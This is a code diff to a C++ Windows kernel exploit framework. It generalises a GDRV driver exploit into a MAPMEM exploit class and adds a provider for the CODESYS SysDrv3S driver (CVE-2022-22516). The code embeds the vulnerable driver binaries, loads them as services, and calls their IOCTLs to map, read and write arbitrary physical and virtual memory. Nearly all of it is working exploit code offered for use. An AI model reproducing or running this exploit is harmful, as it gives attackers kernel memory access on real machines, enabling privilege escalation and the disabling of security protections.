@@ -1,10 +1,9 @@
-/* GDRV driver exploit - Single file implementation */
+/* MAPMEM driver exploit - Supports GDRV, SYSDRV3S, and other MAPMEM-based drivers */
 
 #include <windows.h>
 #include <cstdint>
 #include <expected>
 #include <memory>
-#include <mutex>
 #include <print>
 #include <string>
 #include <vector>
@@ -19,6 +18,8 @@
 extern "C" {
     extern const uint8_t _binary_gdrv_bin_start[];
     extern const uint8_t _binary_gdrv_bin_end[];
+    extern const uint8_t _binary_sysdrv3s_bin_start[];
+    extern const uint8_t _binary_sysdrv3s_bin_end[];
 }
 
 namespace kdu::exploits {
@@ -36,6 +37,16 @@ namespace kdu::exploits {
 
 #define IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY \
     CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+// IOCTL definitions for CODESYS SYSDRV3S (MAPMEM)
+#define FILE_DEVICE_MAPMEM (DWORD)0x00008000
+#define MAPMEM_IOCTL_INDEX (DWORD)0x800
+
+#define IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY \
+    CTL_CODE(FILE_DEVICE_MAPMEM, MAPMEM_IOCTL_INDEX, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY \
+    CTL_CODE(FILE_DEVICE_MAPMEM, MAPMEM_IOCTL_INDEX + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // Structures
 #pragma pack(push, 1)
@@ -61,16 +72,28 @@ static BOOL CallDriver(HANDLE hDevice, DWORD dwIoControlCode,
                           lpOutBuffer, nOutBufferSize, &dwBytesReturned, nullptr);
 }
 
-// GDRV exploit class
-class GdrvExploit : public core::DriverExploit,
-                    public core::IPhysicalMemoryRead,
-                    public core::IPhysicalMemoryWrite,
-                    public core::IVirtualMemoryRead,
-                    public core::IVirtualMemoryWrite,
-                    public core::IVirtualToPhysical,
-                    public core::IQueryPML4 {
+// Base MAPMEM exploit class supporting both GDRV and SYSDRV3S IOCTLs
+class MapMemExploit : public core::DriverExploit,
+                      public core::IPhysicalMemoryRead,
+                      public core::IPhysicalMemoryWrite,
+                      public core::QueryPML4FromPhysicalMixin<MapMemExploit>,
+                      public core::V2PFromPhysicalMixin<MapMemExploit>,
+                      public core::VirtualFromPhysicalMixin<MapMemExploit> {
+protected:
+    DWORD map_ioctl_;
+    DWORD unmap_ioctl_;
+    DWORD v2p_ioctl_;
+    bool supports_v2p_;
+
 public:
-    explicit GdrvExploit(HANDLE device_handle) : DriverExploit(device_handle, L"gdrv") {}
+    explicit MapMemExploit(HANDLE device_handle, std::wstring name,
+                          DWORD map_ioctl, DWORD unmap_ioctl, 
+                          DWORD v2p_ioctl = 0, bool supports_v2p = false)
+        : DriverExploit(device_handle, std::move(name)),
+          map_ioctl_(map_ioctl),
+          unmap_ioctl_(unmap_ioctl),
+          v2p_ioctl_(v2p_ioctl),
+          supports_v2p_(supports_v2p) {}
 
     std::expected<std::vector<uint8_t>, std::string>
     try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
@@ -85,7 +108,7 @@ public:
             request.BusAddress.QuadPart = offset;
             request.Length = mapSize;
 
-            if (!CallDriver(device_handle_, IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
+            if (!CallDriver(device_handle_, map_ioctl_,
                           &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                 return std::unexpected("Failed to map physical memory");
             }
@@ -97,7 +120,7 @@ public:
             ULONG_PTR readOffset = physical_address - offset;
             memcpy(buffer.data(), (PBYTE)pMapSection + readOffset, size);
 
-            CallDriver(device_handle_, IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
+            CallDriver(device_handle_, unmap_ioctl_,
                       &pMapSection, sizeof(PVOID), nullptr, 0);
 
             return buffer;
@@ -117,7 +140,7 @@ public:
             request.BusAddress.QuadPart = offset;
             request.Length = mapSize;
 
-            if (!CallDriver(device_handle_, IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
+            if (!CallDriver(device_handle_, map_ioctl_,
                           &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                 return std::unexpected("Failed to map physical memory");
             }
@@ -129,7 +152,7 @@ public:
             ULONG_PTR writeOffset = physical_address - offset;
             memcpy((PBYTE)pMapSection + writeOffset, data, size);
 
-            CallDriver(device_handle_, IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
+            CallDriver(device_handle_, unmap_ioctl_,
                       &pMapSection, sizeof(PVOID), nullptr, 0);
 
             return {};
@@ -137,85 +160,12 @@ public:
             return std::unexpected("Exception in write_physical_memory");
         }
     }
-
-    std::expected<std::vector<uint8_t>, std::string>
-    try_read_virtual_memory(uintptr_t virtual_address, size_t size) const noexcept override {
-        auto phys = try_virtual_to_physical(virtual_address);
-        if (!phys) return std::unexpected(phys.error());
-        return try_read_physical_memory(*phys, size);
-    }
-
-    std::expected<void, std::string>
-    try_write_virtual_memory(uintptr_t virtual_address, const void* data, size_t size) noexcept override {
-        auto phys = try_virtual_to_physical(virtual_address);
-        if (!phys) return std::unexpected(phys.error());
-        return try_write_physical_memory(*phys, data, size);
-    }
-
-    std::expected<uintptr_t, std::string>
-    try_virtual_to_physical(uintptr_t virtual_address) const noexcept override {
-        GIO_VIRTUAL_TO_PHYSICAL request{};
-        request.Address.QuadPart = virtual_address;
-
-        if (!CallDriver(device_handle_, IOCTL_GDRV_VIRTUALTOPHYSICAL,
-                       &request, sizeof(request), &request, sizeof(request))) {
-            return std::unexpected("Virtual to physical translation failed");
-        }
-
-        // WARNING: GDRV truncates to 32-bit!
-        return static_cast<uintptr_t>(request.Address.LowPart);
-    }
-
-    std::expected<uintptr_t, std::string>
-    try_query_pml4() const noexcept override {
-        try {
-            MAPMEM_PHYSICAL_MEMORY_INFO request{};
-            PVOID pMapSection = nullptr;
-            constexpr DWORD cbRead = 0x100000; // 1MB
-
-            request.BusAddress.QuadPart = 0;
-            request.Length = cbRead;
-
-            if (!CallDriver(device_handle_, IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
-                          &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
-                return std::unexpected("Failed to map low 1MB");
-            }
-
-            if (!pMapSection) {
-                return std::unexpected("Mapping returned null");
-            }
-
-            // Simplified PML4 search - just find first valid-looking entry
-            uintptr_t pml4 = 0;
-            auto* ptr = static_cast<uint64_t*>(pMapSection);
-            for (size_t i = 0; i < cbRead / sizeof(uint64_t); ++i) {
-                uint64_t value = ptr[i];
-                if ((value & 1) && (value & 0xFFFFFFFFF000ULL)) {
-                    pml4 = value & 0xFFFFFFFFF000ULL;
-                    break;
-                }
-            }
-
-            CallDriver(device_handle_, IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
-                      &pMapSection, sizeof(PVOID), nullptr, 0);
-
-            if (pml4 == 0) {
-                return std::unexpected("PML4 not found");
-            }
-
-            return pml4;
-        } catch (...) {
-            return std::unexpected("Exception in query_pml4");
-        }
-    }
 };
 
-
-// Provider
+// GDRV specific provider
 class GdrvProvider : public core::IDriverProvider {
 public:
     GdrvProvider() {
-        // Calculate driver size from bin2obj symbols
         size_t driver_size = _binary_gdrv_bin_end - _binary_gdrv_bin_start;
         
         metadata_.driver_name = "gdrv";
@@ -237,7 +187,6 @@ public:
     }
 
     std::expected<void, std::string> check_available() const noexcept override {
-        // Check if already loaded
         HANDLE hDevice = CreateFileW(
             std::wstring(metadata_.device_name.begin(), metadata_.device_name.end()).c_str(),
             GENERIC_READ | GENERIC_WRITE,
@@ -246,10 +195,9 @@ public:
         
         if (hDevice != INVALID_HANDLE_VALUE) {
             CloseHandle(hDevice);
-            return {}; // Already loaded
+            return {};
         }
         
-        // Check if driver binary is valid
         if (!metadata_.driver_data || metadata_.driver_size == 0) {
             return std::unexpected("Driver binary not embedded");
         }
@@ -264,7 +212,6 @@ public:
         std::wstring device_name(metadata_.device_name.begin(), 
                                 metadata_.device_name.end());
         
-        // Try to use load_driver_from_memory helper
         auto result = load_driver_from_memory(
             metadata_.driver_data,
             metadata_.driver_size,
@@ -276,11 +223,88 @@ public:
             return std::unexpected(result.error());
         }
         
-        return std::make_unique<GdrvExploit>(*result);
+        return std::make_unique<MapMemExploit>(
+            *result, L"gdrv",
+            IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
+            IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
+            IOCTL_GDRV_VIRTUALTOPHYSICAL,
+            true
+        );
     }
 };
 
-// Auto-register
-static core::ProviderRegistrar<GdrvProvider> reg;
+// SYSDRV3S specific provider
+class SysDrv3SProvider : public core::IDriverProvider {
+public:
+    SysDrv3SProvider() {
+        size_t driver_size = _binary_sysdrv3s_bin_end - _binary_sysdrv3s_bin_start;
+        
+        metadata_.driver_name = "SysDrv3S";
+        metadata_.device_name = "\\\\.\\SysDrv3S";
+        metadata_.service_name = "SysDrv3S";
+        metadata_.description = "CODESYS SysDrv3S (CVE-2022-22516)";
+        metadata_.cve_id = "CVE-2022-22516";
+        metadata_.driver_data = _binary_sysdrv3s_bin_start;
+        metadata_.driver_size = driver_size;
+        metadata_.capabilities = 
+            core::AbilityFlags::PhysicalMemoryRead |
+            core::AbilityFlags::PhysicalMemoryWrite |
+            core::AbilityFlags::VirtualMemoryRead |
+            core::AbilityFlags::VirtualMemoryWrite |
+            core::AbilityFlags::QueryPML4 |
+            core::AbilityFlags::MapPhysicalMemory |
+            core::AbilityFlags::UnmapPhysicalMemory;
+    }
+
+    std::expected<void, std::string> check_available() const noexcept override {
+        HANDLE hDevice = CreateFileW(
+            std::wstring(metadata_.device_name.begin(), metadata_.device_name.end()).c_str(),
+            GENERIC_READ | GENERIC_WRITE,
+            0, nullptr, OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL, nullptr);
+        
+        if (hDevice != INVALID_HANDLE_VALUE) {
+            CloseHandle(hDevice);
+            return {};
+        }
+        
+        if (!metadata_.driver_data || metadata_.driver_size == 0) {
+            return std::unexpected("Driver binary not embedded");
+        }
+        
+        return {};
+    }
+
+    std::expected<std::unique_ptr<core::DriverExploit>, std::string>
+    create_instance() noexcept override {
+        std::wstring service_name(metadata_.service_name.begin(), 
+                                 metadata_.service_name.end());
+        std::wstring device_name(metadata_.device_name.begin(), 
+                                metadata_.device_name.end());
+        
+        auto result = load_driver_from_memory(
+            metadata_.driver_data,
+            metadata_.driver_size,
+            service_name,
+            device_name
+        );
+        
+        if (!result) {
+            return std::unexpected(result.error());
+        }
+        
+        return std::make_unique<MapMemExploit>(
+            *result, L"sysdrv3s",
+            IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY,
+            IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY,
+            0,  // No V2P IOCTL for SYSDRV3S
+            false
+        );
+    }
+};
+
+// Auto-register providers
+static core::ProviderRegistrar<GdrvProvider> gdrv_reg;
+static core::ProviderRegistrar<SysDrv3SProvider> sysdrv3s_reg;
 
 }  // namespace kdu::exploits
